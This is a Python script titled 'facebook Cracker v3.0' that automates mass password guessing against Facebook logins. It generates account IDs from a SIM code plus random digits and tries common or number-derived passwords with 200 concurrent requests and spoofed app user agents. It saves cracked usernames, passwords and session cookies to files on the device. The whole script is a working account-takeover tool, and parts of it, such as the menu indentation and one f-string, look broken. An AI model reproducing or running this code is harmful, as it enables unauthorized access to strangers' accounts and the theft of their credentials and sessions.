#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
facebook Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 3.0
Threads: Asynchronous - 200 concurrent tasks
"""

import asyncio
import random
import re
import sys
import time
import hashlib
import uuid
import urllib.request
import requests  # Keep for fallback
import string
import os
import subprocess
import platform
import uuid as uuid_module
import random as random_module
import base64
import json
import aiohttp
from aiohttp import ClientSession, ClientTimeout, TCPConnector
from concurrent.futures import ThreadPoolExecutor
import threading
import math
from typing import List, Dict, Optional, Tuple

# Global variables with proper initialization
loop_counter = 0
oks = []
cps = []
idz = []
bkas = []
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
pink = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
black = "\033[1;30m"

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()
print_lock = threading.Lock()

# Global asyncio semaphore for limiting concurrent connections
connection_semaphore = None

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*46}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

# Device information setup
sim_id = ''
try:
    android_version = subprocess.check_output('getprop ro.build.version.release', shell=True, text=True).strip()
except:
    android_version = "11.0.0"

try:
    model = subprocess.check_output('getprop ro.product.model', shell=True, text=True).strip()
except:
    model = "Redmi Note 9 Pro"

try:
    build = subprocess.check_output('getprop ro.build.id', shell=True, text=True).strip()
except:
    build = "RP1A.200720.011"

fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True, text=True).split(',')[0].strip()
except:
    fbcr = 'Jio'

try:
    fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True, text=True).strip()
except:
    fbmf = 'Redmi'

try:
    fbbd = subprocess.check_output('getprop ro.product.brand', shell=True, text=True).strip()
except:
    fbbd = 'Redmi'

fbdv = model
fbsv = android_version

try:
    fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True, text=True).replace(',', ':').strip()
except:
    fbca = 'arm64-v8a'

try:
    height = subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True, text=True).strip()
    width = subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True, text=True).strip()
    fbdm = f'{{density=2.0,height={height},width={width}}}'
except:
    fbdm = '{density=2.0,height=2400,width=1080}'

device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm
}

# Global device variables for use in async functions
build = device['build']
model = device['model']
ex = device['fbdm']
android_version = device['android_version'] + '.0.0'
versi_android = f"{random.randint(4, 13)}"
fbcr = sim_id if sim_id else "Jio"
fbmf = device['fbmf']
fbbd = device['fbbd']
fbdm = device['fbdm']

async def generate_user_agent() -> str:
    """Generate random user agent"""
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    bv = f"{random.randint(1111111, 7777777)}"
    deevice = random.choice(["2312DRAABG", "2201117TG", "M2101K6G", "Redmi Note 14", "2404ARN45A", "22111317I", 
                           "23053RN02A", "M2101K7AI", "22101316C", "23129RAA4G"])
    
    # Fixed the f-string syntax error
    return f"[FBAN/FB4A;FBAV/{facebook_version};FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/{bv};FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/{deevice};FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1".format(density=2.0, width=1080, height=2400)

async def extract_login_tokens(session: ClientSession, user_agent: str) -> Tuple[Optional[str], Optional[str]]:
    """Extract lsd and jazoest tokens from login page"""
    try:
        url1 = "https://web.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
        headers = {
            "authority": "m.prod.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "dpr": "3",
            "sec-ch-prefers-color-scheme": "light",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": user_agent,
            "viewport-width": "980"
        }
        
        async with connection_semaphore:
            async with session.get(url1, headers=headers, timeout=ClientTimeout(total=30)) as response:
                text = await response.text()
                
                # Extract lsd token
                lsd_match = re.search(r'name="lsd" value="([^"]+)"', text)
                lsd = lsd_match.group(1) if lsd_match else None
                
                # Extract jazoest token
                jazoest_match = re.search(r'name="jazoest" value="([^"]+)"', text)
                jazoest = jazoest_match.group(1) if jazoest_match else None
                
                return lsd, jazoest
    except Exception as e:
        return None, None

async def async_crack(uid: str, password_list: List[str], total_count: int, session: ClientSession):
    """Asynchronous facebook account cracking function"""
    global loop_counter
    
    # Thread-safe counter increment
    with counter_lock:
        loop_counter += 1
        progress = loop_counter
    
    # Update progress display
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    color = random.choice(colors)
    
    success_count = len(oks)
    fail_count = len(cps)
    percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
    
    with print_lock:
        sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
        sys.stdout.flush()
    
    try:
        # Generate user agent for this attempt
        user_agent = await generate_user_agent()
        
        for pw in password_list:
            try:
                # Extract login tokens
                lsd, jazoest = await extract_login_tokens(session, user_agent)
                
                if not lsd or not jazoest:
                    continue
                
                # Prepare login data
                encpass = f"#PWD_BROWSER:0:{int(time.time())}:{pw}"
                
                log_data = {
                    'email': uid,
                    'cuid': 'AYg-Zk3oBYS1IvkNsDBz-LJWCgiozUvirKReZ1dxv4ymdNH3-gkKiiEuQ3_Rpg2-uoR7dwTRnmUx9szEXe_sejzDUnWbSwZwAuHZk3vAOeLkUW_b-pZaVzxEfnOd8x6lbr-fj70m99RHpZ6fC6rmgYN1e_QBicJQHFf1syDbJj7I6fAxI9NAVX3N3s1Wl4txmUyFCGnqZ85kbHXGeJLvDbcbpXcjPc4TC4itvKF1DUZiMVg00N_n-VYTcff5UAZ9mCg',
                    'guid': 'ffcc6be62735888e9',
                    'lgnjs': '1765922875',
                    'lgnrnd': '140753__cXd',
                    'locale': 'en_GB',
                    'login_source': 'comet_login_header',
                    'next': 'https://www.facebook.com/logiy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzY1OTIyODUwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%253D%253D&next',
                    'skstamp': '',
                    'timezone': '-330',
                    'prefill_contact_point': '',
                    'prefill_source': '',
                    'lsd': lsd,
                    'jazoest': jazoest,
                    'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
                    'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AZMZAAAAAFAA',
                    'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc2NTkyMjg3Ni4xODgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp7InciOjExMDUsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoiZGVmYXVsdCJ9XSwiMzAwMDgiOlt7InQiOjE3NjU5MjI4NzYuMjM5LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoiNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDMuMC4wLjAgU2FmYXJpLzUzNy4zNiJ9XSwiMzAwMTUiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzY1OTIyODc2LjE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc2NTkyMjg3Ni4yMDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzY1OTIyODc2LjIwNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NjU5MjI4NzYuMjA1LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6NX1dLCIzMDEwNiI6W3sidCI6MTc2NTkyMjg3Ni4xODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzY1OTIyODc2LjIyOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3NjU5MjI4NzYuMTg1LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp6YWxzZX1dfQ==',
                    'encpass': encpass,
                }
                
                # Prepare headers
                headers = {
                    "authority": "web.facebook.com",
                    "method": "POST",
                    "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
                    "scheme": "https",
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
                    "cache-control": "max-age=0",
                    "content-type": "application/x-www-form-urlencoded",
                    "dpr": "3",
                    "origin": "https://web.facebook.com",
                    "referer": "https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
                    "sec-ch-prefers-color-scheme": "light",
                    "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
                    "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-model": "\"\"",
                    "sec-ch-ua-platform": "\"Linux\"",
                    "sec-ch-ua-platform-version": "\"\"",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1",
                    "user-agent": user_agent,
                    "viewport-width": "980"
                }
                
                # Send login request
                url = "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1"
                
                async with connection_semaphore:
                    async with session.post(url, data=log_data, headers=headers, allow_redirects=False, timeout=ClientTimeout(total=30)) as response:
                        cookies = response.cookies
                        
                        # Check for successful login (c_user cookie)
                        if 'c_user' in cookies:
                            cookie_parts = []
                            for key in ['datr', 'fr', 'sb', 'c_user', 'xs']:
                                if key in cookies:
                                    cookie_parts.append(f"{key}={cookies[key].value}")
                            
                            if cookie_parts:
                                kuki = ";".join(cookie_parts)
                                user_match = re.findall(r'c_user=([^;]+)', kuki)
                                if user_match:
                                    user = user_match[0]
                                    
                                    # Verify the account with profile picture check
                                    profile_url = f'https://graph.facebook.com/{user}/picture?type=normal'
                                    async with session.get(profile_url, timeout=ClientTimeout(total=10)) as profile_resp:
                                        profile_text = await profile_resp.text()
                                        
                                        if 'Photoshop' in profile_text or 'profile' in profile_text.lower():
                                            with success_lock:
                                                print(f'\n\033[1;92m OK {user}|{pw}')
                                                print(f"\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m{kuki}")
                                                
                                                # Save to file
                                                with open("/sdcard/SUMON_RANDOM_IDS.txt", "a") as f:
                                                    f.write(f"{user}|{pw}|{kuki}\n")
                                                
                                                oks.append(user)
                                            return True
                        
                        # Check for checkpoint (2FA required)
                        elif 'checkpoint' in cookies:
                            with success_lock:
                                print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                                with open("/sdcard/SUMON_file_2f.txt", "a") as f:
                                    f.write(f"{uid}|{pw}\n")
                                cps.append(f"{uid}|{pw}")
                            continue
                            
            except asyncio.TimeoutError:
                continue
            except aiohttp.ClientError:
                continue
            except Exception:
                continue
                
    except Exception:
        pass
    
    return False

def get_password_patterns(uid: str) -> List[str]:
    """Generate password patterns based on UID"""
    return [
        uid[:6],      # First 6 digits
        uid[:7],      # First 7 digits
        uid[:8],      # First 8 digits
        uid,          # Full number
        '57273200',   # Static common password
        '123456',
        '123456789',
        uid[-6:],     # Last 6 digits
        'password',
        'qwerty',
        '111111',
        '000000',
    ]

def generate_random_ids(limit: int):
    """Generate random 6-digit IDs"""
    idz.clear()
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    print(f" \033[1;92m[✓] Generated {len(idz):,} IDs successfully!")
    return idz

async def progress_monitor(total_tasks: int, start_time: float):
    """Monitor and display progress"""
    global loop_counter
    
    while True:
        await asyncio.sleep(1)
        
        with counter_lock:
            progress = loop_counter
            elapsed = time.time() - start_time
            
            if elapsed > 0:
                speed = progress / elapsed
                eta = (total_tasks - progress) / speed if speed > 0 else 0
            else:
                speed = 0
                eta = 0
            
            percentage = (progress / float(total_tasks) * 100) if total_tasks > 0 else 0
            
            with print_lock:
                sys.stdout.write(f"\r\033[1;93m[*] Progress: {progress:,}/{total_tasks:,} ({percentage:.1f}%) | "
                               f"Speed: {speed:.1f} IDs/sec | ETA: {eta:.0f}s | "
                               f"OK: {len(oks):,} | CP: {len(cps):,}")
                sys.stdout.flush()
        
        # Check if all tasks are done
        if progress >= total_tasks:
            break

async def run_async_attack(code: str, limit: int):
    """Run asynchronous attack"""
    global loop_counter, connection_semaphore
    
    # Reset counters
    with counter_lock:
        loop_counter = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Generate IDs
    generate_random_ids(limit)
    
    # Create connection semaphore (limit concurrent connections)
    connection_semaphore = asyncio.Semaphore(200)  # 200 concurrent connections
    
    # Create HTTP session with optimized settings
    connector = TCPConnector(
        limit=200,  # Max connections
        limit_per_host=50,  # Max connections per host
        ttl_dns_cache=300,  # DNS cache TTL
        force_close=True,  # Close connections immediately
        enable_cleanup_closed=True  # Clean up closed connections
    )
    
    timeout = ClientTimeout(total=30, connect=10, sock_read=20)
    
    start_time = time.time()
    tasks = []
    
    async with ClientSession(connector=connector, timeout=timeout) as session:
        # Start progress monitor
        monitor_task = asyncio.create_task(progress_monitor(len(idz), start_time))
        
        # Create tasks for each ID
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            task = asyncio.create_task(async_crack(uid, password_patterns, len(idz), session))
            tasks.append(task)
        
        # Wait for all tasks to complete
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            print(f"\n\033[1;93m[!] Interrupted by user. Cancelling tasks...")
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            monitor_task.cancel()
            return
        
        # Cancel monitor task
        monitor_task.cancel()
        try:
            await monitor_task
        except asyncio.CancelledError:
            pass
    
    return start_time

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🎯 FACEBOOK ASYNC CLONING 🎯")
    print(f"\033[1;96m{'='*46}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Async Workers: \033[1;92m200 concurrent tasks")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    
    # Get limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 1000")
        limit = 1000
        time.sleep(2)
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*46}")
    print(f"\033[1;96m     🔥 STARTING ASYNC ATTACK 🔥")
    print(f"\033[1;96m{'='*46}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs to Generate: \033[1;32m{limit:,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f' \033[1;36m(⚡) \033[1;37mConcurrent Tasks: \033[1;32m200')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mAsynchronous Mode - Much Faster!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mSUMON_RANDOM_IDS.txt')
    linex()
    
    # Run async attack
    try:
        start_time = asyncio.run(run_async_attack(code, limit))
    except KeyboardInterrupt:
        print(f"\n\033[1;93m[!] Attack interrupted by user")
        input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        return
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    print("\n")
    linex()
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;92m[✓] ASYNC ATTACK COMPLETED!")
    print(f"\033[1;92m{'='*46}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{limit:,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{limit/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
        print(f" \033[1;92m[💾] Results saved to: /sdcard/SUMON_RANDOM_IDS.txt")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     🚀 FACEBOOK CRACKER v3.0 🚀")
    print(f"\033[1;96m{'='*46}")
    print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Async Random Number Cloning (200 Tasks)")
    print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
    print(f" \033[1;97m[\033[1;92m3\033[1;97m] ⚡ Performance Test")
    print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
    print(f"\033[1;96m{'='*46}")
    
    choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
    
    if choice == '1':
        random_number()
    elif choice == '2':
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
        print(f"\033[1;96m{'='*46}")
        print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
        print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
        print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
        print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop_counter}")
        print(f" \033[1;97m[⚡] Async Mode: \033[1;92mEnabled (200 tasks)")
        linex()
        input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
    elif choice == '3':
        clear()
        print(f"\033[1;96m{'='*46}")
        print(f"\033[1;96m     ⚡ PERFORMANCE TEST ⚡")
